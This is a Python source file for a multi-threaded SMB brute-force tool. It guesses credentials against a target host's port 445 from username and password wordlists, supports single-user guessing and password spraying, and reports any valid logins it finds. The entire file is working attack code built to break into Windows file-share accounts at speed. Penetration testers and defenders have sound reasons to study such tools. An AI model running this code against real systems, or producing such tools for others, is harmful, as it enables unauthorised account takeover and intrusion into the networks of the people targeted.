# Multi Threaded SMB Bruteforcer
# Author: Karim (cpu0x00)

from smb.SMBConnection import SMBConnection
import socket
import concurrent.futures
from os import _exit
import argparse
import time

parser = argparse.ArgumentParser(epilog='(M)ulti (T)hreaded (S)MB (B)ruteforcer')

parser.add_argument('--target', '-t', required=True, help='target ip address')
parser.add_argument('--usersfile','-uf', help='users wordlist')
parser.add_argument('--user', '-u', help='single username to use')
parser.add_argument('--passwords', '-pf', help='passwords wordlist')
parser.add_argument('--password','-p', help='single password to use')
parser.add_argument('--port', type=int, default=445, help='smb port (default: 445)')
parser.add_argument('--threads', type=int, help='threads to use (default: 100)', default=100)
parser.add_argument('--verbose', '-v', action='store_true', help='verbose the bruteforcing attempts')
parser.add_argument('--stop_on_find', action='store_true', help='stops once find a single valid user:password')


args = parser.parse_args()

print('[*] Multi Threaded SMB Bruteforcer')

target = args.target

server_name = socket.gethostbyname(target)

me = socket.gethostname()

found = []

start = time.perf_counter()
def connect(user, password):
	smbClient = SMBConnection(user, password, me, server_name,is_direct_tcp=True,use_ntlm_v2=True)
	if args.verbose:
		print(f'trying {user}:{password}')
	if smbClient.connect(target, args.port):
		finish = time.perf_counter()
		found.append(f'[*] found valid creds: {user}:{password}')
		print(f'\n[*] found valid creds: {user}:{password}')
		print(f'[*] finished in: {round(finish - start)} second(s)')
		if args.stop_on_find:
			_exit(1)




if args.usersfile and args.passwords: # iterating through users and passwords 


	password_wordlist = args.passwords
	users_wordlist = args.usersfile

	userlist = open(users_wordlist ,'r', encoding='latin1').readlines()
	users = [u.strip() for u in userlist] # using list comprehnsion for performance improvment

	passlist = open(password_wordlist ,'r', encoding='latin1').readlines()
	passwords = [p.strip() for p in passlist] # using list comprehnsion for performance improvment

	print(f'[*] working with {len(userlist)} usernames')
	print(f'[*] working with {len(passlist)} passwords\n')
	if args.threads > 100:
		print('[!] you are using more than 100 threads with the (-uf) and (-pf) flags results may not be accurate !')
		print('[!] 100 threads is recommended with this mode \n')
	if not args.verbose:
		
		print('[*] Bruteforcing...')
	

	with concurrent.futures.ThreadPoolExecutor(args.threads) as executer: # running with multiple threads at one time for speed enhancing

		result = [executer.submit(connect, user, password) for user in users for password in passwords]

	if not found:
		print('[-] there is no user:password match in the files')
	if found:
		print('\n')
		print('\n'.join(found))



if args.user: # bruteforcing single user

	password_wordlist = args.passwords
	passlist = open(password_wordlist ,'r', encoding='latin1').readlines()
	passwords = [p.strip() for p in passlist] # using list comprehnsion for performance improvment

	if not args.verbose:
		
		print(f'\n[*] Bruteforcing...')

	with concurrent.futures.ThreadPoolExecutor(args.threads) as executer: # running with multiple threads at one time for speed enhancing

		result = [executer.submit(connect, args.user, password) for password in passwords]

	if not found:
		print(f'[-] did not find password for user ({args.user})')
	if found:
		print('\n')
		print('\n'.join(found))


if args.password and args.usersfile: # password spraying 

	users_wordlist = args.usersfile
	userlist = open(users_wordlist ,'r', encoding='latin1').readlines()
	users = [u.strip() for u in userlist] # using list comprehnsion for performance improvment

	if not args.verbose:
		print(f'\n[*] Bruteforcing...')

	with concurrent.futures.ThreadPoolExecutor(args.threads) as executer: # running with multiple threads at one time for speed enhancing

		result = [executer.submit(connect, user, args.password) for user in users]

	if not found:
		print(f'[-] no user matched with password: {args.password}')

	if found:
		print('\n')
		print('\n'.join(found))
